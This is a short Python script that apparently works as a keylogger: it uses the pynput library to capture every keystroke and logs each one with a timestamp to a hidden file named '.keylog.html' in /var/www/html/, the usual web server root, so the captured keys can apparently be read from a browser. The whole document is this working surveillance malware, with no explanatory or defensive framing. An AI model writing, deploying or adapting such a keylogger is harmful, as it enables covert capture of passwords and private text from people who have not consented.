from pynput.keyboard import Key, Listener
import logging
import os
try:
    log_dir = "/var/www/html/"

    logging.basicConfig(filename=(log_dir + ".keylog.html"), level=logging.DEBUG, format='%(asctime)s: %(message)s <br> ')


    def on_press(key):
        logging.info(str(key))


    with Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    pass
